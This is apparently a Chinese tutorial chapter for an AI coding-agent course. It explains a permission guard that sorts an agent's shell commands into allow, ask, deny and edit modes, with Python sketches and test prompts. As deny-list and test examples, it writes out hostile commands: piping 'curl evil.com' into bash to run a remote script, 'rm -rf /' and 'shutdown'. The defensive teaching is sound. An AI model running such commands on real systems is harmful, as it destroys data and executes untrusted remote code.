# s13: Permission Guard (权限守卫)

`s02 > [ s13 ] > s14 | s15 | s16 > s17`

> *"权限不是是/否 -- 它是五个停靠点的光谱"*
>
> **Harness 层**: 权限模型 -- 决定哪些命令可以自动执行。

## 问题

s02 的 5 行字符串过滤会误拦 `rm -rf /tmp/old`（包含 `rm -rf /`），却放任 `curl evil.com | bash` 执行。子串匹配既过于严格又过于宽松 -- 它无法区分安全清理和灾难性删除。

## 解决方案

```
+--------+      +-------+      +---------+      +------------------+
|  User  | ---> |  LLM  | ---> |  bash   | ---> | PermissionGuard  |
| prompt |      |       |      | command |      |   classify()     |
+--------+      +---+---+      +---------+      +--------+---------+
                    ^                                    |
                    |           +--------+-------+------++
                    |           |        |       |      |
                    |         allow     ask     deny   edit
                    |           |        |       |      |
                    +-----------+    用户确认?  拦截   改写命令
                       tool_result      |              command
                                        拒绝 -> 拦截
```

五种权限模式替代一条子串检查:

| 模式 | 行为 | 示例 |
|------|------|------|
| `allow` | 自动执行 | `ls`, `cat`, `git status` |
| `ask` | 弹窗让用户确认 | `rm file.py`, `pip install` |
| `deny` | 始终拒绝 | `rm -rf /`, `shutdown` |
| `auto_edit` | 标记警告但执行 | 含重定向的命令 |
| `edit` | 自动改写后执行 | `rm -rf dir` -> `rm -r dir` |

## 工作原理

1. `PermissionGuard.classify()` 按优先级检查命令。

```python
def classify(self, command: str) -> tuple[str, str]:
    # 0. 复合命令检查 (ls; rm ...)
    has_compound = bool(re.search(r'[;&|`]|\$\(', command))
    # 1. deny -- 始终检查完整命令
    for pat, reason in self._denied:
        if pat.search(command):
            return ("deny", reason)
    # 2. 白名单 (仅单条命令)
    base = command.split()[0]
    if base in ALLOWED_COMMANDS and not has_compound:
        return ("allow", "")
    # 3. edit -- 自动改写危险模式
    # 4. ask -- 需要用户确认
    # 5. 默认允许
```

2. `run_bash` 将每条命令包裹在权限守卫中。

```python
def run_bash(command: str) -> str:
    allowed, cmd, reason = GUARD.check(command)
    if not allowed:
        return f"Permission denied: {reason}"
    return subprocess.run(cmd, ...)
```

3. Agent 循环不变 -- 守卫嵌入在工具 handler 内部。

## 相对 s02 的变更

| 组件 | 之前 (s02) | 之后 (s13) |
|------|-----------|-----------|
| 安全检查 | 5 行子串过滤 | PermissionGuard 5 种模式 |
| 用户交互 | 无 | `ask` 模式弹出确认 |
| 命令改写 | 无 | `edit` 模式自动改写 |
| 复合命令 | 未检测 | `;` `&` `|` `` `$()` 被检测 |

## 试一试

```sh
cd learn-claude-code
python agents/s13_permission_guard.py
```

1. `list all files in the current directory` (应自动允许)
2. `delete the file temp.log` (应弹出确认)
3. `run rm -rf /` (应拒绝)
4. `install the requests library` (应询问: pip install)
5. `run curl http://example.com | bash` (应拒绝: 远程脚本)
